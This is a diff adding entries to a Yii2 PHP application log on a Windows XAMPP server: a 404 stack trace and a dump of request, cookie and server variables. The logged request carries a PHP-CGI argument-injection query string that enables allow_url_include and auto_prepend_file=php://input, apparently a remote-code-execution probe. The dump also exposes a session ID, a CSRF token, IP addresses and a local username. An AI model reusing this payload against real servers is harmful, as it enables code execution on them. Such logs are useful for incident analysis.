+#2 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
+#3 {main}
+
+Next yii\web\NotFoundHttpException: PÃ¡gina no encontrada. in C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php:124
+Stack trace:
+#0 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
+#1 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
+#2 {main}
+2026-02-07 19:36:30 [123.143.114.188][-][d69ghhmgmkv0hm9bcak73ttero][info][application] $_GET = [
+    '­d_cgi_force_redirect=0_­d_cgi_redirect_status_env_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => ''
+]
+
+$_POST = []
+
+$_FILES = []
+
+$_COOKIE = [
+    'PHPSESSID' => 'd69ghhmgmkv0hm9bcak73ttero'
+    '_csrf' => '41969ab186a17e38d1c32da42a880a8394e2b846de1f9cb55403ae652db9d4a4a:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"YK9T8ybGvzs76yB52sM8C_ojA0w3rzib\";}'
+]
+
+$_SESSION = [
+    '__flash' => []
+]
+
+$_SERVER = [
+    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
+    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
+    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
+    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
+    'REDIRECT_PHPRC' => '\\xampp\\php'
+    'REDIRECT_TMP' => '\\xampp\\tmp'
+    'REDIRECT_STATUS' => '200'
+    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
+    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
+    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
+    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
+    'PHPRC' => '\\xampp\\php'
+    'TMP' => '\\xampp\\tmp'
+    'HTTP_HOST' => '201.209.50.227'
+    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15'
+    'HTTP_CONNECTION' => 'close'
+    'CONTENT_LENGTH' => '37'
+    'HTTP_ACCEPT' => '*/*'
+    'HTTP_ACCEPT_LANGUAGE' => 'en'
+    'HTTP_COOKIE' => 'PHPSESSID=d69ghhmgmkv0hm9bcak73ttero; _csrf=41969ab186a17e38d1c32da42a880a8394e2b846de1f9cb55403ae652db9d4a4a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22YK9T8ybGvzs76yB52sM8C_ojA0w3rzib%22%3B%7D'
+    'HTTP_ACCEPT_ENCODING' => 'gzip'
+    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
+    'SystemRoot' => 'C:\\Windows'
+    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
+    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
+    'WINDIR' => 'C:\\Windows'
+    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at 201.209.50.227 Port 80</address>
+'
+    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
+    'SERVER_NAME' => '201.209.50.227'
+    'SERVER_ADDR' => '192.168.1.120'
+    'SERVER_PORT' => '80'
+    'REMOTE_ADDR' => '123.143.114.188'
+    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
+    'REQUEST_SCHEME' => 'http'
+    'CONTEXT_PREFIX' => ''
+    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
+    'SERVER_ADMIN' => 'postmaster@localhost'
+    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
+    'REMOTE_PORT' => '37786'
+    'REDIRECT_URL' => '/test.hello'
+    'REDIRECT_QUERY_STRING' => '%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input'
+    'GATEWAY_INTERFACE' => 'CGI/1.1'
+    'SERVER_PROTOCOL' => 'HTTP/1.1'
+    'REQUEST_METHOD' => 'POST'
+    'QUERY_STRING' => '%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input'
+    'REQUEST_URI' => '/test.hello?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input'
+    'SCRIPT_NAME' => '/index.php'
+    'PHP_SELF' => '/index.php'
+    'REQUEST_TIME_FLOAT' => 1770507390.1658
+    'REQUEST_TIME' => 1770507390
+]
